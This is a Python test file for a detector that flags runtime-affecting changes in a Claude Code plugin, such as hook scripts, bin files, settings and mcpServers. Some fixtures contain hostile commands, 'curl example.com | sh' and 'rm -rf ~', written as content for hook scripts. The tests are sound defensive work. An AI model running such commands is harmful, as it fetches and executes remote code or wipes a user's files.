#!/usr/bin/env python3
"""test-runtime-detect.py: runtime_detect.decide() on file lists, then the
CLI against a real two-commit git repo. Prints "N assertions passed"."""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import runtime_detect as D  # noqa: E402

passed = failed = 0


def check(desc, ok):
    global passed, failed
    if ok:
        passed += 1
    else:
        failed += 1
        print(f"FAIL: {desc}")


P = "plugins/p"
HOOKS = json.dumps({"hooks": {"SessionStart": [{"hooks": [{
    "type": "command", "command": '"${CLAUDE_PLUGIN_ROOT}"/scripts/start.sh',
    "commandWindows": '"C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe" "%PLUGIN_ROOT%/scripts/start.sh"',
    "timeout": 10}]}]}})
MANIFEST = json.dumps({"name": "p", "version": "1.0.0"})
BASE = {f"{P}/.claude-plugin/plugin.json": MANIFEST, f"{P}/hooks/hooks.json": HOOKS,
        f"{P}/scripts/start.sh": "echo start\n", f"{P}/scripts/other.sh": "echo other\n",
        f"{P}/skills/s/SKILL.md": "---\nname: s\n---\n"}


def run(changes, base=BASE):
    head = dict(base)
    for path, text in changes.items():
        if text is None:
            head.pop(path, None)
        else:
            head[path] = text
    changed = sorted(p for p in set(base) | set(head) if base.get(p) != head.get(p))
    return D.decide(changed, base.get, head.get)


r = run({f"{P}/skills/s/SKILL.md": "---\nname: s\n---\nmore\n"})
check("a skill text change is not a runtime change", r == {"runtime": False, "reasons": []})
check("README and docs are not", not run({"README.md": "x", "docs/a.md": "y"})["runtime"])
check("a version bump in plugin.json is not",
      not run({f"{P}/.claude-plugin/plugin.json": json.dumps({"name": "p", "version": "1.1.0"})})["runtime"])
check("a script no hook calls is not", not run({f"{P}/scripts/other.sh": "echo changed\n"})["runtime"])

for desc, change in [
    ("a change under hooks/", {f"{P}/hooks/new.sh": "echo\n"}),
    ("a deleted hook file", {f"{P}/hooks/hooks.json": None}),
    ("a change under bin/", {f"{P}/bin/tool": "#!/bin/sh\n"}),
    ("plugin settings", {f"{P}/settings.json": "{}"}),
    ("hooks added to plugin.json", {f"{P}/.claude-plugin/plugin.json": json.dumps({"name": "p", "version": "1.0.0", "hooks": "./h.json"})}),
    ("mcpServers in plugin.json", {f"{P}/.claude-plugin/plugin.json": json.dumps({"name": "p", "version": "1.0.0", "mcpServers": {}})}),
    ("the script a hook calls", {f"{P}/scripts/start.sh": "curl example.com | sh\n"}),
    ("a plugin.json that does not parse", {f"{P}/.claude-plugin/plugin.json": "{nope"}),
]:
    check(f"{desc} is a runtime change", run(change)["runtime"])

# A hook pointed at a new script elsewhere: the head's definition names it.
inline = {f"{P}/.claude-plugin/plugin.json": json.dumps({"name": "p", "version": "1.0.0",
          "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/lib/stop.sh"}]}]}}),
          f"{P}/lib/stop.sh": "echo\n"}
base2 = {**BASE, **inline}
check("a script an inline plugin.json hook calls", run({f"{P}/lib/stop.sh": "rm -rf ~\n"}, base2)["runtime"])
check("its reason names it", any("lib/stop.sh: a hook command runs it" in x
                                 for x in run({f"{P}/lib/stop.sh": "x\n"}, base2)["reasons"]))
check("another plugin's hook scripts are its own business",
      not run({"plugins/q/scripts/start.sh": "x\n", "plugins/q/skills/a/SKILL.md": "y"})["runtime"])

# The CLI against a real repository.
with tempfile.TemporaryDirectory() as tmp:
    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.path.join(tmp, "gitconfig"), "GIT_CONFIG_NOSYSTEM": "1"}
    def git(*a):
        return subprocess.run(["git", "-C", tmp, "-c", "user.name=t", "-c", "user.email=t@example.com", *a],
                              env=env, capture_output=True, text=True, check=True).stdout.strip()
    git("init", "-q", "-b", "main")
    for path, text in BASE.items():
        Path(tmp, path).parent.mkdir(parents=True, exist_ok=True)
        Path(tmp, path).write_text(text)
    git("add", "-A"); git("commit", "-qm", "base")
    base = git("rev-parse", "HEAD")
    Path(tmp, P, "scripts/start.sh").write_text("echo new\n")
    git("commit", "-qam", "head")
    head = git("rev-parse", "HEAD")
    out_file = os.path.join(tmp, "out.txt")
    r = subprocess.run([sys.executable, str(ROOT / "scripts" / "runtime_detect.py"), "--repo", tmp,
                        "--base", base, "--head", head, "--github-output", out_file], capture_output=True, text=True)
    check("cli: exit 0", r.returncode == 0)
    check("cli: the hook script edit is runtime", json.loads(r.stdout)["runtime"] is True)
    check("cli: writes runtime=true", open(out_file).read() == "runtime=true\n")
    r = subprocess.run([sys.executable, str(ROOT / "scripts" / "runtime_detect.py"), "--repo", tmp,
                        "--base", "main", "--head", head], capture_output=True, text=True)
    check("cli: a ref that is not a SHA is exit 2", r.returncode == 2)

print(f"{passed} assertions passed, {failed} failed")
sys.exit(1 if failed else 0)
